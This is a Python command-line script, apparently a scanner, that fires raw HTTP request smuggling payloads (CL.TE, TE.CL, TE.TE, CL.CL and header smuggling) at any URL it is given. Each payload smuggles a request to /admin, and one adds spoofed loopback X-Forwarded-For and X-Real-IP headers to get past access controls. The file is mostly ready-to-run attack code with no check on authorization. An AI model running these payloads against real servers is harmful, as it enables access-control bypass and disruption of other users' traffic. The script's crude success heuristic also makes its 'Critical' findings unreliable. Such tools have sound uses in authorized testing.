#!/usr/bin/env python3
"""
HTTP SMUGGLING TESTER - REQUEST SMUGGLING VULNERABILITY DISCOVERY
Tests for HTTP request smuggling vulnerabilities
"""
import requests
import socket
import time

class HTTPSmugglingTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
        
    def test_all_http_smuggling(self):
        """Test all HTTP smuggling techniques"""
        print(f"[*] Starting HTTP smuggling testing on {self.target_url}")
        
        self.test_cl_te_smuggling()
        self.test_te_cl_smuggling()
        self.test_te_te_smuggling()
        self.test_cl_cl_smuggling()
        self.test_header_smuggling()
        
        return self.vulnerabilities
    
    def test_cl_te_smuggling(self):
        """Test CL.TE smuggling"""
        print("[*] Testing CL.TE smuggling...")
        
        # CL.TE payload
        payload = """POST /admin HTTP/1.1\r
Host: {host}\r
Content-Length: 13\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: {host}\r
\r
""".format(host=self._extract_host())
        
        if self._send_raw_request(payload):
            self.vulnerabilities.append({
                "type": "CL.TE HTTP Smuggling",
                "severity": "Critical",
                "url": self.target_url,
                "description": "Content-Length vs Transfer-Encoding confusion"
            })
    
    def test_te_cl_smuggling(self):
        """Test TE.CL smuggling"""
        print("[*] Testing TE.CL smuggling...")
        
        # TE.CL payload
        payload = """POST /admin HTTP/1.1\r
Host: {host}\r
Content-Length: 3\r
Transfer-Encoding: chunked\r
\r
8\r
\r
GET /admin HTTP/1.1\r
Host: {host}\r
\r
0\r
\r
""".format(host=self._extract_host())
        
        if self._send_raw_request(payload):
            self.vulnerabilities.append({
                "type": "TE.CL HTTP Smuggling",
                "severity": "Critical",
                "url": self.target_url,
                "description": "Transfer-Encoding vs Content-Length confusion"
            })
    
    def test_te_te_smuggling(self):
        """Test TE.TE smuggling"""
        print("[*] Testing TE.TE smuggling...")
        
        # TE.TE payload with obfuscated Transfer-Encoding
        payload = """POST /admin HTTP/1.1\r
Host: {host}\r
Content-Length: 3\r
Transfer-Encoding: chunked\r
Transfer-encoding: identity\r
\r
8\r
\r
GET /admin HTTP/1.1\r
Host: {host}\r
\r
0\r
\r
""".format(host=self._extract_host())
        
        if self._send_raw_request(payload):
            self.vulnerabilities.append({
                "type": "TE.TE HTTP Smuggling",
                "severity": "Critical",
                "url": self.target_url,
                "description": "Duplicate Transfer-Encoding headers"
            })
    
    def test_cl_cl_smuggling(self):
        """Test CL.CL smuggling"""
        print("[*] Testing CL.CL smuggling...")
        
        # CL.CL payload
        payload = """POST /admin HTTP/1.1\r
Host: {host}\r
Content-Length: 3\r
Content-Length: 0\r
\r
GET /admin HTTP/1.1\r
Host: {host}\r
\r
""".format(host=self._extract_host())
        
        if self._send_raw_request(payload):
            self.vulnerabilities.append({
                "type": "CL.CL HTTP Smuggling",
                "severity": "Critical",
                "url": self.target_url,
                "description": "Duplicate Content-Length headers"
            })
    
    def test_header_smuggling(self):
        """Test header smuggling"""
        print("[*] Testing header smuggling...")
        
        # Header smuggling payload
        payload = """POST /admin HTTP/1.1\r
Host: {host}\r
Content-Length: 0\r
\r
GET /admin HTTP/1.1\r
Host: {host}\r
X-Forwarded-For: 127.0.0.1\r
X-Real-IP: 127.0.0.1\r
\r
""".format(host=self._extract_host())
        
        if self._send_raw_request(payload):
            self.vulnerabilities.append({
                "type": "Header Smuggling",
                "severity": "High",
                "url": self.target_url,
                "description": "Header injection via request smuggling"
            })
    
    def _extract_host(self):
        """Extract host from URL"""
        from urllib.parse import urlparse
        parsed = urlparse(self.target_url)
        return parsed.netloc
    
    def _send_raw_request(self, payload):
        """Send raw HTTP request"""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(self.target_url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if parsed.scheme == 'https':
                import ssl
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            sock.send(payload.encode())
            
            # Receive response
            response = sock.recv(4096).decode()
            sock.close()
            
            # Check for smuggling indicators
            return self._check_smuggling_response(response)
            
        except Exception as e:
            print(f"[-] Error sending raw request: {e}")
            return False
    
    def _check_smuggling_response(self, response):
        """Check response for smuggling indicators"""
        indicators = [
            "200 OK" in response,
            "admin" in response.lower(),
            "unauthorized" not in response.lower(),
            "forbidden" not in response.lower(),
            len(response) > 100
        ]
        return sum(indicators) >= 3

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 http_smuggling_tester.py <url>")
        sys.exit(1)
    
    tester = HTTPSmugglingTester(sys.argv[1])
    vulns = tester.test_all_http_smuggling()
    
    print(f"\n[+] Found {len(vulns)} potential HTTP smuggling vulnerabilities")
    for vuln in vulns:
        print(f"  - {vuln['type']}: {vuln['severity']}")
